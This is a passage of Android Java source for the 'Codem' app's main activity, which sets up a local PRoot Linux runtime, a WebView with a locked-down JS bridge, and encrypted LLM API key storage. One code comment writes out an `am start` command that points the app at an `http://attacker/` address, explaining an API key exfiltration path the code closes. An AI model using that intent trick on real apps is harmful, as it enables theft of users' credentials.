package com.codem.remote;

import android.Manifest;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Environment;
import android.net.ConnectivityManager;
import android.net.Uri;
import android.net.LinkProperties;
import android.net.Network;

import java.net.InetAddress;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;

import android.app.Activity;
import android.app.AlertDialog;
import android.content.SharedPreferences;
import android.content.pm.ApplicationInfo;
import android.provider.Settings;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.text.InputType;
import android.util.Log;
import android.view.Gravity;
import android.view.View;
import android.view.ViewGroup;
import android.webkit.CookieManager;
import android.webkit.JavascriptInterface;
import android.webkit.WebChromeClient;
import android.webkit.WebResourceRequest;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import android.widget.Button;
import android.widget.EditText;
import android.widget.LinearLayout;
import android.widget.TextView;

import java.io.BufferedInputStream;
import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.LinkOption;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.nio.file.attribute.PosixFilePermission;
import java.util.HashSet;
import java.util.Set;
import java.util.concurrent.atomic.AtomicBoolean;
import java.util.zip.GZIPInputStream;

/**
 * Codem 的 Android 外壳 —— **自包含形态**（阶段 3 终态）：
 * APK 里带着 PRoot + Ubuntu rootfs + Node + 静态 codem-db + Host + 共享 UI，
 * 首次启动解压，然后在本机起 Host，WebView 连 `127.0.0.1`。
 *
 * 设计取舍（见 docs/architecture/ADR-0002）：
 * - **targetSdk 28**：Android 10+ 对 targetSdk≥29 的应用禁止从可写目录 exec / ptrace 自己的子进程，
 *   PRoot 依赖这两件事。Termux 用同一取舍。代价是不能上架 Play（本项目走 sideload）。
 * - 可执行文件放 `lib/<abi>/lib*.so`（nativeLibraryDir，安装时由系统解出、可执行）；
 *   数据（rootfs/Host/UI/共享库）走 assets，首启解压到 filesDir。
 * - 解压是纯 Java（GZIP + tar 解析），不依赖设备上的 tar（toybox 对 xz/硬链接支持不一）。
 */
public class MainActivity extends Activity {
    private static final String TAG = "CodemShell";
    /**
     * 本机凭据的引导 fragment：`#token=<64hex>`。
     *
     * 只用一次：共享 UI 读到后立刻 `history.replaceState` 抹掉，并存进 sessionStorage。
     * 凭据本身每次 Host 启动都不同（`HostSupervisor` 生成），端口也是随机分配的。
     */
    private static final String LOCAL_AUTH_FRAGMENT = "#token=";
    private static final String PREFS = "codem";
    private static final String KEY_URL = "host_url";
    /** 本机项目工作区名（相对 files/data/workspace；空 = 根） */
    private static final String KEY_WORKSPACE = "workspace_name";
    /** JS 桥的名字：**只有 loopback 页面**能看见（见 {@link NativeBridge}） */
    private static final String BRIDGE_NAME = "CodemNative";

    private WebView webView;
    /** 深链目标（loopback 时要等本机 Host 起来再打开） */
    private volatile String pendingUrl;
    private TextView status;
    private final Handler ui = new Handler(Looper.getMainLooper());
    /** 本机 Host 的启动/停止/重启（设置保存后要用） */
    private HostSupervisor supervisor;
    /** 当前页面地址（由 WebViewClient 在 UI 线程更新；JS 桥用它复核 origin） */
    private volatile String currentPageUrl = "";
    /** 当前页面是否 loopback（桥开关的第二个条件） */
    private volatile boolean loopbackPage;
    /** 首启/重启的 setup 只允许一个线程在跑（onCreate/onNewIntent/onResume 都可能触发） */
    private final AtomicBoolean setupRunning = new AtomicBoolean(false);
    private AlertDialog settingsDialog;
    private AlertDialog busyDialog;
    /** 首次启动前申请共享存储权限；结果回来后再决定用共享目录还是私有回退 */
    private boolean pendingStorageStart;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        // 真机操作用例用：允许 WebView CDP（只在显式 extra 时开启，不影响普通用户）
        if (getIntent() != null && getIntent().getBooleanExtra("webviewDebug", false)) {
            WebView.setWebContentsDebuggingEnabled(true);
        }
        webView = newWebView();

        /*
         * D-7 迁移：旧版本把访问令牌存在 prefs 并拼进 URL；这条通道已停用。
         * 清掉残留值（不再读取），避免"升级后旧凭据还躺在应用数据里"。
         */
        if (prefs().contains("remote_token")) prefs().edit().remove("remote_token").apply();

        // 深链（自动化/远程通知）：loopback 要先确保本机 Host 在跑；远程地址直接打开
        String deepLink = takeUrlIntent();
        if (deepLink != null) {
            if (isLoopback(deepLink)) {
                pendingUrl = deepLink;
                startLocal();
            } else {
                openOnlyWebView(deepLink);
            }
            return;
        }
        // 自动化/深链可带配置：**只有 debuggable 构建**才接受（见方法注释）
        applyConfigExtrasIfDebuggable();

        if (!ensureStorageAccess()) return;
        startInitial();
    }

    /** 首次启动的入口：有配置/运行时就直接起本机 Host，否则显示开始页 */
    private void startInitial() {
        boolean configured = !prefs().getString(LlmSecretStore.KEY_BASE, "").isEmpty();
        boolean ready = new File(getFilesDir(), ".runtime-ready").exists();
        if (configured || ready) {
            startLocal();
        } else {
            showStartScreen();
        }
    }

    /**
     * 共享目录 `/storage/emulated/0/codem/workspace` 需要「所有文件访问」。
     * 没授权时不阻塞应用：用户拒绝就回退应用私有工作区。
     */
    private boolean ensureStorageAccess() {
        if (Build.VERSION.SDK_INT >= 30) {
            if (Environment.isExternalStorageManager()) return true;
            if (pendingStorageStart) return false;
            pendingStorageStart = true;
            new AlertDialog.Builder(this)
                    .setTitle("项目目录授权")
                    .setMessage("Codem 需要「所有文件访问」权限，才能把项目放在 /storage/emulated/0/codem/workspace（文件管理器可见）。\n\n拒绝也可以使用应用私有目录，但外部文件管理器看不到。")
                    .setPositiveButton("去授权", (d, w) -> {
                        try {
                            startActivity(new Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION,
                                    Uri.parse("package:" + getPackageName())));
                        } catch (Throwable t) {
                            startActivity(new Intent(Settings.ACTION_MANAGE_ALL_FILES_ACCESS_PERMISSION));
                        }
                    })
                    .setNegativeButton("暂不", (d, w) -> {
                        pendingStorageStart = false;
                        startInitial();
                    })
                    .setCancelable(false)
                    .show();
            return false;
        }
        if (needsStoragePermission()) {
            pendingStorageStart = true;
            requestPermissions(new String[]{Manifest.permission.WRITE_EXTERNAL_STORAGE, Manifest.permission.READ_EXTERNAL_STORAGE}, 1001);
            return false;
        }
        return true;
    }

    private boolean needsStoragePermission() {
        // Android 13+ 的 WRITE_EXTERNAL_STORAGE 已不再授予；targetSdk28 依赖 legacy 行为，
        // 这里只在 23..32 主动申请，13+ 由 WorkspacePaths 探测/回退。
        if (Build.VERSION.SDK_INT < 23 || Build.VERSION.SDK_INT > 32) return false;
        return checkSelfPermission(Manifest.permission.WRITE_EXTERNAL_STORAGE) != PackageManager.PERMISSION_GRANTED;
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        if (requestCode != 1001) return;
        // 拒绝也不阻塞：WorkspacePaths 会回退到应用私有工作区
        if (pendingStorageStart) {
            pendingStorageStart = false;
            startInitial();
        }
    }

    /** 统一一处创建 WebView：设置项只写一次，重试用的是同一套 */
    private WebView newWebView() {
        WebView view = new WebView(this);
        android.webkit.WebSettings settings = view.getSettings();
        settings.setJavaScriptEnabled(true);
        settings.setDomStorageEnabled(true);
        /*
         * targetSdk=28 时 `allowFileAccess` 默认是 **true**：页面里的 XHR 能读
         * `file:///…`（Host 的 web 目录之外的应用私有文件也能读）。这几条一律关掉，
         * 页面只允许 http(s)。
         */
        settings.setAllowFileAccess(false);
        settings.setAllowContentAccess(false);
        settings.setAllowFileAccessFromFileURLs(false);
        settings.setAllowUniversalAccessFromFileURLs(false);
        view.setWebViewClient(new ShellClient());
        view.setWebChromeClient(new WebChromeClient());
        return view;
    }

    /**
     * 自动化 extras（`llmBase` / `llmModel` / `llmKey`）**只在 debuggable 构建生效**。
     *
     * 为什么必须门禁：`MainActivity` 是 exported。任意 App 都能
     * `am start -n com.codem.remote/.MainActivity --es llmBase http://attacker/…`；
     * 旧实现会把它写进 prefs，于是 Host 拿着**已保存的真 Key**去请求攻击者的地址
     * —— 这是一条不需要任何权限的 Key 外送通道。release 构建必须忽略这些 extras。
     * 同时把 extra 从 intent 里拿掉：它会留在 `dumpsys activity` 的 intent 里。
     */
    private void applyConfigExtrasIfDebuggable() {
        android.content.Intent intent = getIntent();
        if (intent == null) return;
        if (!isDebuggable()) return;
        String base = intent.getStringExtra("llmBase");
        String model = intent.getStringExtra("llmModel");
        String key = intent.getStringExtra("llmKey");
        intent.removeExtra("llmBase");
        intent.removeExtra("llmModel");
        intent.removeExtra("llmKey");
        if (base != null && !base.trim().isEmpty()) {
            prefs().edit().putString(LlmSecretStore.KEY_BASE, base.trim()).apply();
        }
        if (model != null && !model.trim().isEmpty()) {
            prefs().edit().putString(LlmSecretStore.KEY_MODEL, model.trim()).apply();
        }
        if (key != null && !key.trim().isEmpty()) {
            try {
                LlmSecretStore.saveKey(prefs(), key);
            } catch (LlmSecretStore.SecretException e) {
                // 只记类型/人话，绝不记 Key
                Log.w(TAG, "debug extra key rejected: " + e.getMessage());
            }
        }
    }

    private boolean isDebuggable() {
        return (getApplicationInfo().flags & ApplicationInfo.FLAG_DEBUGGABLE) != 0;
    }

    private void startLocal() {
        // 单飞：conCreate / onNewIntent / onResume 都可能触发；两个线程同时解压/起 Host 会互相踩
        if (!setupRunning.compareAndSet(false, true)) return;
        showStatus("正在准备本机运行时（首次启动需要十几秒）…");
        new Thread(() -> {
            try {
                prepareAndLaunch();
            } finally {
                setupRunning.set(false);
            }
        }, "codem-setup").start();
    }

    private SharedPreferences prefs() {
        return getSharedPreferences(PREFS, MODE_PRIVATE);
    }

    /** 启动页上的一行状态（只说"有没有/加没加密"，永远不显示 Key） */
    private String startScreenKeyState() {
        LlmSecretStore.State s = LlmSecretStore.state(prefs());
        if (s == LlmSecretStore.State.KEYSTORE) return "已保存的 Key：已加密保存（留空保持不变）";
        if (s == LlmSecretStore.State.LEGACY) return "⚠ 已保存的 Key 仍是明文（本机加密未成功），建议重新输入并保存";
        if (s == LlmSecretStore.State.UNREADABLE) return "⚠ 已保存的 Key 在本机解不开，请重新输入";
        return LlmSecretStore.hasStoredKey(prefs()) ? "已保存 Key" : "";
    }

    // ===== 本机模型设置（原生对话框） =====

    private interface PersistCallback {
        void onSaved(LlmConfig config);

        void onFailed(String message);
    }

    /**
     * 保存配置：Keystore 加密 + prefs 落盘都在**后台线程**（`commit()` 是同步磁盘 IO）。
     *
     * 失败只回一句人话（异常消息里没有 Key —— `LlmSecretStore` 保证），而且**不会**重启 Host：
     * "旧配置已经停了、新配置没落盘"是最坏的中间态。
     */
    private void persistConfig(String baseUrl, String model, String apiKey, boolean clearKey, PersistCallback callback) {
        new Thread(() -> {
            try {
                LlmSecretStore.saveConfig(prefs(), baseUrl, model, apiKey, clearKey);
                final LlmConfig config = LlmSecretStore.loadConfig(prefs());
                ui.post(() -> callback.onSaved(config));
            } catch (LlmSecretStore.SecretException e) {
                final String message = e.getMessage() == null ? "本机存储失败" : e.getMessage();
                ui.post(() -> callback.onFailed(message));
            } catch (Throwable t) {
                // 兜底：绝不把异常对象原样打到 UI（可能带参数），只留下类型
                Log.w(TAG, "save llm config failed: " + t.getClass().getSimpleName());
                ui.post(() -> callback.onFailed("本机存储失败（" + t.getClass().getSimpleName() + "）"));
            }
        }, "codem-settings-save").start();
    }

    /** 打开原生设置框（只有 loopback 页面 / 错误页能到这儿） */
    private void showLlmSettings() {
        if (isFinishing()) return;
        if (settingsDialog != null && settingsDialog.isShowing()) return;
        settingsDialog = LlmSettingsDialog.show(
                this,
                prefs().getString(LlmSecretStore.KEY_BASE, ""),
                prefs().getString(LlmSecretStore.KEY_MODEL, ""),
                LlmSecretStore.hasStoredKey(prefs()),
                LlmSecretStore.state(prefs()),
                prefs().getString(KEY_WORKSPACE, ""),
                WorkspacePaths.root(this),
                this::applyLlmSettings);
    }

    /** 对话框回调：保存 → 重启 Host → 刷新页面（远程页面不动） */
    private void applyLlmSettings(String baseUrl, String model, String apiKey, boolean clearKey, String workspace) {
        // 清除 Key 时对话框传的是空 base/model：沿用已保存的那份，别把地址一起清掉
        final String base = clearKey ? prefs().getString(LlmSecretStore.KEY_BASE, "") : baseUrl;
        final String targetModel = clearKey ? prefs().getString(LlmSecretStore.KEY_MODEL, "") : model;
        showBusy("正在保存配置…");
        persistConfig(base, targetModel, apiKey, clearKey, new PersistCallback() {
            @Override
            public void onSaved(LlmConfig config) {
                prefs().edit().putString(KEY_WORKSPACE, workspace == null ? "" : workspace).apply();
                restartHostAsync(config);
            }

            @Override
            public void onFailed(String message) {
                hideBusy();
                showSettingsError("保存失败：" + message + "\n（Key 没有写入任何日志）");
            }
        });
    }

    /**
     * 重启本机 Host 并刷新页面。
     *
     * 只重启 Node（不 force-stop）：会话数据在 `files/data`，配对 cookie 不动；
     * 远程 PC 页面不受影响（本机配置只影响本机 Host）。
     */
    private void restartHostAsync(LlmConfig config) {
        showBusy("正在重启本机 Host…\n（会话与工作区会保留）");
        new Thread(() -> {
            String failure = null;
            try {
                if (supervisor == null) throw new IOException("本机运行时尚未准备好，请重新打开应用后重试");
                supervisor.setWorkspace(prefs().getString(KEY_WORKSPACE, ""));
                supervisor.restart(config, hostLog());
                if (!supervisor.waitHealthy(120_000)) failure = "新 Host 未在 120s 内就绪（查看 filesDir/host.log）";
            } catch (IOException e) {
                failure = e.getMessage() == null ? "重启失败" : e.getMessage();
            } catch (Throwable t) {
                Log.w(TAG, "restart failed: " + t.getClass().getSimpleName());
                failure = "重启失败（" + t.getClass().getSimpleName() + "）";
            }
            final String message = failure;
            ui.post(() -> {
                hideBusy();
                if (message != null) {
                    showSettingsError("配置已保存，但本机 Host 没能按新配置启动：\n" + message);
                    return;
                }
                if (webView == null) return;
                if (isLoopback(currentPageUrl)) {
                    // 端口与凭据都变了：换成新 URL 并强制整页重载（只改 hash 不会重载）
                    reloadLocalPage();
                } else if (currentPageUrl.isEmpty()) {
                    // 之前在错误页/启动页（没有页面）：重启成功后直接进本机页面
                    openLocalTarget("/");
                }
                // 其余情况 = 用户正在看远程 PC 页面：本机配置不影响它，不打断
            });
        }, "codem-settings-restart").start();
    }

    private void showBusy(String text) {
        hideBusy();
        busyDialog = new AlertDialog.Builder(this)
                .setMessage(text)
                .setCancelable(false)
                .create();
        busyDialog.show();
    }

    private void hideBusy() {
        if (busyDialog != null && busyDialog.isShowing()) busyDialog.dismiss();
        busyDialog = null;
    }

    private void showSettingsError(String message) {
        if (isFinishing()) return;
        new AlertDialog.Builder(this)
                .setTitle("模型设置")
                .setMessage(message)
                .setPositiveButton("好", null)
                .show();
    }

    // ===== WebView 与原生桥 =====

    /**
     * 只有 **当前本机端点** 的页面才注入 `window.CodemNative`；离开它立刻移除。
     *
     * 两个细节：
     * - `addJavascriptInterface` **必须在页面加载前**调用才对该页面生效（之后调用要等下次 reload）；
     * - `removeJavascriptInterface` 对**已经加载**的 frame 不保证立刻生效 ⇒ 桥的方法里再复核一次
     *   当前页面 origin（见 {@link NativeBridge}）。
     *
     * 为什么按端口精确匹配而不是"loopback 就行"：端口随机后，同机任何本地服务都可能是
     * 127.0.0.1:其他端口；只按"loopback"判会把桥交给一个不是我们 Host 的页面。
     */
    private void prepareBridgeForLoad(String url) {
        currentPageUrl = url == null ? "" : url;
        loopbackPage = isLocalHostPage(currentPageUrl);
        if (loopbackPage) {
            webView.addJavascriptInterface(new NativeBridge(), BRIDGE_NAME);
        } else {
            webView.removeJavascriptInterface(BRIDGE_NAME);
        }
    }

    /** 打开本机（loopback）页面：先装桥，再加载 */
    private void openLocalPage(String url) {
        prepareBridgeForLoad(url);
        setContentView(webView);
        Log.i(TAG, "loading local " + safeUrlForLog(url));
        webView.loadUrl(url);
    }

    /**
     * 拼本机页面 URL：当前随机端口 + 一次性引导 fragment。
     *
     * 端点未就绪（还没起过 Host / 已停）返回 null —— 调用方必须自己处理，
     * 而不是拼一个"看起来能开"的 URL（那只会得到 404 或 connection refused）。
     */
    private String localUrl(String pathAndQuery) {
        HostSupervisor.Endpoint ep = HostSupervisor.endpoint();
        if (ep == null) return null;
        String suffix = pathAndQuery == null || pathAndQuery.isEmpty() ? "/" : pathAndQuery;
        if (!suffix.startsWith("/")) suffix = "/" + suffix;
        return "http://127.0.0.1:" + ep.port + suffix + LOCAL_AUTH_FRAGMENT + ep.token;
    }

    /** 统一的"打开本机页面"入口：只接受 path + query（端口/凭据由当前端点决定）。 */
    private void openLocalTarget(String pathAndQuery) {
        String url = localUrl(pathAndQuery);
        if (url == null) {
            showError(new IOException("本机 Host 端点尚未就绪，请重试"));
            return;
        }
        openLocalPage(url);
    }

    /**
     * 从任意本机 URL 里取出 `path + query`（丢掉旧端口、旧 fragment、旧的强制重载参数）。
     *
     * 深链可能是升级前写死的 `http://127.0.0.1:8787/...`：端口已经不可信，
     * 但 `?open=` / `?selftest=1` 是调用方真正的意图，必须保留。
     */
    private static String localPathAndQuery(String url) {
        if (url == null || url.isEmpty()) return "/";
        try {
            java.net.URI u = java.net.URI.create(url);
            String path = u.getRawPath() == null || u.getRawPath().isEmpty() ? "/" : u.getRawPath();
            String query = u.getRawQuery();
            if (query == null || query.isEmpty()) return path;
            // `_r` 是我们自己加的强制重载参数（非秘密）；累积多个没有意义
            query = query.replaceAll("(^|&)_r=[0-9]+", "");
            if (query.startsWith("&")) query = query.substring(1);
            return query.isEmpty() ? path : path + "?" + query;
        } catch (Exception e) {
            return "/";
        }
    }

    /**
     * 重新加载当前本机页面（Host 重启后端口与凭据都变了）。
     *
     * 为什么不能只 `webView.reload()`：重载会重新走当前 URL（旧端口 + 旧 fragment），
     * 而"只改 fragment"通常不会让 WebView 重新加载文档 ⇒ 页面还拿着旧凭据。
     * 这里换成新 URL，并加一个**非秘密**的 `_r=<ts>` 查询参数强制整页重载。
     */
    private void reloadLocalPage() {
        if (webView == null) return;
        String pathAndQuery = localPathAndQuery(currentPageUrl);
        String separator = pathAndQuery.contains("?") ? "&" : "?";
        openLocalTarget(pathAndQuery + separator + "_r=" + System.currentTimeMillis());
    }

    /** 桥是否可用：页面必须**现在**仍然是本机端点（防止导航到远程后残留的接口被调用） */
    private boolean bridgeAllowed() {
        return loopbackPage && isLocalHostPage(currentPageUrl);
    }

    /**
     * 注入到页面的原生桥 —— **只有两个方法可用**，没有 Key getter、没有 save、没有 URL 能力。
     *
     * 这些方法跑在 WebView 的 JS 线程（不是 UI 线程）：所以这里只做内存读 + `ui.post`，
     * 绝不在这里做磁盘 IO / 网络 / 重启。
     */
    private final class NativeBridge {
        @JavascriptInterface
        public int getVersion() {
            return 1;
        }

        /** 打开原生设置框（无参数、无返回值） */
        @JavascriptInterface
        public void openLlmSettings() {
            if (!bridgeAllowed()) return;
            ui.post(() -> {
                if (bridgeAllowed()) showLlmSettings();
            });
        }

        /** 非秘密摘要（JSON 字符串）；页面拿不到 Key / 密文 / 哈希 */
        @JavascriptInterface
        public String getLlmSettingsSummary() {
            if (!bridgeAllowed()) return "";
            return LlmSecretStore.summaryJson(prefs());
        }
    }

    /** 只放行 http(s)：`intent:` / `file:` / `javascript:` 一律拦掉（不弹给外部 App） */
    private static boolean isHttpUrl(String url) {
        return url != null && (url.startsWith("http://") || url.startsWith("https://"));
    }

    private final class ShellClient extends WebViewClient {
        @Override
        public void onPageStarted(WebView view, String url, android.graphics.Bitmap favicon) {
            super.onPageStarted(view, url, favicon);
            currentPageUrl = url == null ? "" : url;
            loopbackPage = isLocalHostPage(currentPageUrl);
            if (!loopbackPage) view.removeJavascriptInterface(BRIDGE_NAME);
        }

        @Override
        public void onPageFinished(WebView view, String url) {
            super.onPageFinished(view, url);
            currentPageUrl = url == null ? "" : url;
            loopbackPage = isLocalHostPage(currentPageUrl);
            if (!loopbackPage) view.removeJavascriptInterface(BRIDGE_NAME);
        }

        @Override
        public boolean shouldOverrideUrlLoading(WebView view, String url) {
            if (isHttpUrl(url)) return false;
            Log.w(TAG, "blocked non-http navigation: " + safeUrlForLog(url));
            return true;
        }

        @Override
        public boolean shouldOverrideUrlLoading(WebView view, WebResourceRequest request) {
            String url = request != null && request.getUrl() != null ? request.getUrl().toString() : null;
            if (isHttpUrl(url)) return false;
            Log.w(TAG, "blocked non-http navigation: " + safeUrlForLog(url));
            return true;
        }
    }

    /** 首启/未配置时的一屏：填模型服务，或连接电脑 */
    private void showStartScreen() {
        LinearLayout root = new LinearLayout(this);
        root.setOrientation(LinearLayout.VERTICAL);
        root.setPadding(48, 72, 48, 48);

        TextView title = new TextView(this);
        title.setText("Codem");
        title.setTextSize(24);
        root.addView(title);

        TextView hint = new TextView(this);
        hint.setText("本机运行需要模型服务；填好点「本机启动」。也可以直接连接电脑上的 Codem。");
        hint.setPadding(0, 16, 0, 24);
        root.addView(hint);

        final EditText base = field("模型服务地址（如 https://api.deepseek.com）", prefs().getString(LlmSecretStore.KEY_BASE, ""));
        root.addView(base);
        /*
         * Key **不再回填**：旧实现把明文 Key 塞回 EditText，而 EditText 默认会把文本
         * 存进 instance state（旋转/系统回收时可能落盘）。已保存的 Key 只显示状态。
         */
        final EditText key = field("API Key（留空沿用已保存的 Key）", "");
        key.setInputType(InputType.TYPE_CLASS_TEXT | InputType.TYPE_TEXT_VARIATION_PASSWORD);
        key.setSaveEnabled(false);
        key.setImportantForAutofill(View.IMPORTANT_FOR_AUTOFILL_NO_EXCLUDE_DESCENDANTS);
        root.addView(key);
        final TextView keyState = new TextView(this);
        keyState.setText(startScreenKeyState());
        keyState.setPadding(0, 4, 0, 8);
        root.addView(keyState);
        final EditText model = field("模型名（如 deepseek-chat）", prefs().getString(LlmSecretStore.KEY_MODEL, ""));
        root.addView(model);

        final TextView error = new TextView(this);
        error.setPadding(0, 8, 0, 0);
        root.addView(error);

        Button start = new Button(this);
        start.setText("本机启动");
        start.setOnClickListener(v -> {
            String baseValue = base.getText().toString().trim();
            String modelValue = model.getText().toString().trim();
            String keyValue = key.getText().toString().trim();
            String problem = LlmSettingsDialog.validate(baseValue, modelValue, keyValue);
            if (problem != null) {
                error.setText(problem);
                return;
            }
            error.setText("");
            persistConfig(baseValue, modelValue, keyValue, false, new PersistCallback() {
                @Override
                public void onSaved(LlmConfig config) {
                    startLocal();
                }

                @Override
                public void onFailed(String message) {
                    error.setText(message);
                }
            });
        });
        LinearLayout.LayoutParams lp = new LinearLayout.LayoutParams(
                ViewGroup.LayoutParams.WRAP_CONTENT, ViewGroup.LayoutParams.WRAP_CONTENT);
        lp.gravity = Gravity.END;
        lp.topMargin = 16;
        root.addView(start, lp);

        TextView sep = new TextView(this);
        sep.setText("\n或者：连接电脑上的 Codem（地址见电脑端「设置 → 连接手机」，可经 Tailscale/Cloudflare）");
        sep.setPadding(0, 32, 0, 8);
        root.addView(sep);

        final EditText remote = field("电脑地址", prefs().getString("remote_url", ""));
        root.addView(remote);
        /*
         * D-7：不再在原生页输入访问令牌。
         *
         * 旧实现把 token 拼进 URL（`?token=`），既进 WebView 历史，也会被
         * `openOnlyWebView` 的日志原样写进 logcat。现在连接页只填地址；打开页面后
         * 由共享 UI 的配对门输入 6 位配对码。设备凭据由 Host 以 HttpOnly cookie
         * 下发，页面 JS 拿不到；静态 `CODEM_HOST_TOKEN` 只留给桌面/CLI 的
         * break-glass，不再暴露给手机 UI。
         */
        TextView tokenHint = new TextView(this);
        tokenHint.setText("连接后按页面提示输入电脑上生成的 6 位配对码。");
        tokenHint.setPadding(0, 4, 0, 8);
        root.addView(tokenHint);
        Button connect = new Button(this);
        connect.setText("连接电脑");
        connect.setOnClickListener(v -> {
            String url = remote.getText().toString().trim();
            if (url.isEmpty()) return;
            prefs().edit().putString("remote_url", url).apply();
            openOnlyWebView(url);
        });
        LinearLayout.LayoutParams lp2 = new LinearLayout.LayoutParams(
                ViewGroup.LayoutParams.WRAP_CONTENT, ViewGroup.LayoutParams.WRAP_CONTENT);
        lp2.gravity = Gravity.END;
        lp2.topMargin = 8;
        root.addView(connect, lp2);

        setContentView(root);
    }

    private EditText field(String hintText, String value) {
        EditText e = new EditText(this);
        e.setHint(hintText);
        e.setText(value);
        e.setSingleLine(true);
        e.setInputType(InputType.TYPE_CLASS_TEXT | InputType.TYPE_TEXT_VARIATION_URI);
        return e;
    }

    // ===== 启动流程 =====

    private void prepareAndLaunch() {
        try {
            File files = getFilesDir();
            File root = new File(files, "rootfs");
            File app = new File(files, "app");
            File data = new File(files, "data");
            File libs = new File(files, "libs");
            File marker = new File(files, ".runtime-ready");
            File bin = new File(files, "bin");
            // 手机本机项目工作区：持久数据目录（Host 重启/升级都不清）
            mkdirs(new File(data, "workspace"));

            if (!marker.exists()) {
                showStatus("解压 Linux 运行时（约 30MB）…");
                extractAsset("rootfs.tar.gz", root);
                showStatus("安装 Host 与界面…");
                mkdirs(app);
                mkdirs(new File(app, "web"));
                copyAsset("host.mjs", new File(app, "host.mjs"));
                copyAsset("web/index.html", new File(app, "web/index.html"));
                copyAsset("web/ui.js", new File(app, "web/ui.js"));
                mkdirs(libs);
                copyAsset("libtalloc.so.2", new File(libs, "libtalloc.so.2"));
                copyAsset("libandroid-shmem.so", new File(libs, "libandroid-shmem.so"));
                mkdirs(data);
                marker.createNewFile();
            }

            // Ubuntu base 不带 libstdc++，而 Node 需要它：随 APK 带一份，放进 guest 的 lib 目录
            copyGuestLib(root, "libstdc++.so.6", "usr/lib/x86_64-linux-gnu/libstdc++.so.6", "usr/lib/aarch64-linux-gnu/libstdc++.so.6");
            // bash 在 Ubuntu base 里缺 libtinfo（真机用例实测：exit 127 "libtinfo.so.6: cannot open"）
            copyGuestLib(root, "libtinfo.so.6", "usr/lib/x86_64-linux-gnu/libtinfo.so.6", "usr/lib/aarch64-linux-gnu/libtinfo.so.6");
            // 真机实测：Ubuntu base 没有 CA 证书，Node fetch(https) 会 "fetch failed"
            copyGuestLib(root, "ca-certificates.crt", "etc/ssl/certs/ca-certificates.crt");
            writeDnsConfig(root);

            // 可执行文件从 nativeLibraryDir 复制到 files/bin 并置 +x：
            // targetSdk=28 允许从 app 数据目录 exec（见类注释的取舍）。
            installExes(bin);
            seedWelcome(files, root, bin, data, libs);

            /*
             * 迁移旧明文 Key → Keystore 密文（启动 Host 之前完成）。
             * 幂等；失败不会丢 Key（见 `LlmSecretStore.migrate`）。
             */
            LlmSecretStore.migrate(prefs());
            LlmConfig config = LlmSecretStore.loadConfig(prefs());

            if (supervisor == null) supervisor = new HostSupervisor(files, root, app, data, WorkspacePaths.root(this), libs, bin);
            supervisor.setWorkspace(prefs().getString(KEY_WORKSPACE, ""));
            startKeepAlive();
            showStatus("启动本机 Host…");
            supervisor.ensureStarted(config, hostLog());
            showStatus("等待 Host 就绪…");
            if (!supervisor.waitHealthy(120_000)) {
                throw new IOException("Host 未在 120s 内就绪（查看 filesDir/host.log）");
            }
            ui.post(() -> {
                String target = pendingUrl;
                pendingUrl = null;
                // 页面已经由深链打开时不要再用根路径覆盖（setup 与深链存在竞争）
                if (target != null) {
                    // 深链可能带着升级前的旧端口（8787）：只保留 path/query，端口与凭据用当前的
                    openLocalTarget(localPathAndQuery(target));
                } else if (webView.getUrl() == null) {
                    openLocalTarget("/");
                } else {
                    setContentView(webView);
                }
            });
        } catch (Exception e) {
            Log.e(TAG, "setup failed", e);
            ui.post(() -> showError(e));
        }
    }

    private void installExes(File bin) throws IOException {
        mkdirs(bin);
        String nativeDir = getApplicationInfo().nativeLibraryDir;
        for (String name : new String[] { "libproot.so", "libproot_loader.so", "libcodem_db.so", "libnode.so" }) {
            File src = new File(nativeDir, name);
            File dst = new File(bin, name.replace("lib", "").replace(".so", ""));
            if (!dst.exists()) copyFile(src, dst);
            dst.setExecutable(true, false);
        }
    }

    /** 首次启动写一个欢迎会话（数据为空时才写）；走 proot，因为静态 codem-db 在 app 进程的 seccomp 下会 SIGSYS */
    private void seedWelcome(File files, File root, File bin, File data, File libs) throws IOException {
        File db = new File(data, "codem-db-rust.bin");
        if (db.exists()) return;
        mkdirs(data);
        mkdirs(new File(files, "tmp"));
        prootDb(root, bin, data, libs, "sessions.upsert",
            "{\"id\":\"welcome\",\"project_id\":\"\",\"title\":\"欢迎使用 Codem\",\"created_at\":" + System.currentTimeMillis() + "}");
        prootDb(root, bin, data, libs, "messages.create",
            "{\"id\":\"welcome-m1\",\"session_id\":\"welcome\",\"role\":\"assistant\",\"content\":\"这是手机本机上的 Codem。模型与凭据在「信息 → 本机模型设置」里配置；项目文件放在本机工作区。\",\"timestamp\":" + (System.currentTimeMillis() + 1) + "}");
    }

    private void prootDb(File root, File bin, File data, File libs, String command, String json) throws IOException {
        ProcessBuilder pb = new ProcessBuilder(
                new File(bin, "proot").getAbsolutePath(), "-0",
                "-r", root.getAbsolutePath(),
                "-b", "/dev", "-b", "/proc", "-b", "/sys",
                "-b", bin.getAbsolutePath() + ":/opt/bin",
                "-b", data.getAbsolutePath() + ":/opt/data",
                "-w", "/", "--link2symlink", "-L",
                "/opt/bin/codem_db", "--db", "/opt/data/codem-db-rust.bin", "invoke", command, "-");
        pb.environment().put("PROOT_LOADER", new File(bin, "proot_loader").getAbsolutePath());
        pb.environment().put("PROOT_TMP_DIR", new File(root.getParentFile(), "tmp").getAbsolutePath());
        pb.environment().put("LD_LIBRARY_PATH", libs.getAbsolutePath() + ":" + bin.getAbsolutePath());
        pb.redirectErrorStream(true);
        Process p = pb.start();
        StringBuilder out = new StringBuilder();
        Thread reader = new Thread(() -> {
            try (InputStream stdout = p.getInputStream()) {
                byte[] buf = new byte[4096];
                int n;
                while ((n = stdout.read(buf)) > 0) out.append(new String(buf, 0, n, StandardCharsets.UTF_8));
            } catch (IOException ignored) { }
        });
        reader.start();
        try (OutputStream stdin = p.getOutputStream()) {
